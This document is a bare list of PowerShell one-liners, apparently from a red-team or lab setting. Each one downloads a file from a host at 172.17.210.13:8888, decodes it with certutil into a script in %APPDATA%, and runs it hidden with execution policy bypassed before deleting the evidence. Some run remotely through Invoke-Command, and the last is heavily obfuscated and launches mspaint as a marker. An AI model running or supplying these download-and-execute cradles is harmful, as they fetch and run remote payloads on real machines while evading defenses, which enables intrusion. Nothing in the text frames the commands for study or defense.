& "iex powershell.exe" -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://172.17.210.13:8888/leaving_cert.cer'); & "$env:windir\system32\certutil.exe" -decode %APPDATA%\leaving_cert.cer %APPDATA%\huge_load.ps1 | start /b cmd /c powershell.exe  -Exec Bypass -NoExit -File %APPDATA%\huge_load.ps1 | start /b cmd /c del %APPDATA%\leaving_cert.cer


icm  -ScriptBlock { & "powershell.exe" -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\leaving_cert.cer (New-Object Net.WebClient).DownloadString('http://172.17.210.13:8888/leaving_cert.cer'); & "$env:windir\system32\certutil.exe" -decode %APPDATA%\leaving_cert.cer %APPDATA%\huge_load.ps1 | start /b cmd /c powershell.exe  -Exec Bypass -NoExit -File %APPDATA%\huge_load.ps1 | start /b cmd /c del %APPDATA%\leaving_cert.cer}


icm  -ScriptBlock { & "powershell.exe" -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\leaving_cert.cer (New-Object Net.WebClient).DownloadString('http://172.17.210.13:8888/big_load.txt'); & "$env:windir\system32\certutil.exe" -decode %APPDATA%\leaving_cert.cer %APPDATA%\huge_load.ps1 | start /b cmd /c powershell.exe  -Exec Bypass -NoExit -File %APPDATA%\huge_load.ps1 | start /b cmd /c del %APPDATA%\leaving_cert.cer}


SV kR2 'http://172.17.210.13:8888/big_load.txt';&( (Variable PsH* -ValueOnl)[21]+(GV P*ho*).Value[30]+'x')((certutil.exe /ping (Variable kR2).Value|&$ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).GetCommand($ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Get-Member)[6].Name)|Get-Member|Where-Object{$_.Name-ilike'G*om*e'}).Name).Invoke('*ct-O*',1,$TRUE),[Management.Automation.CommandTypes]::Cmdlet)-SkipLas 1|&$ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).GetCommand($ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Get-Member)[6].Name)|Get-Member|Where-Object{$_.Name-ilike'G*om*e'}).Name).Invoke('*ct-O*',1,$TRUE),[Management.Automation.CommandTypes]::Cmdlet)-Skip 2)-Join"`r`n");cmd.exe /c mspaint.exe






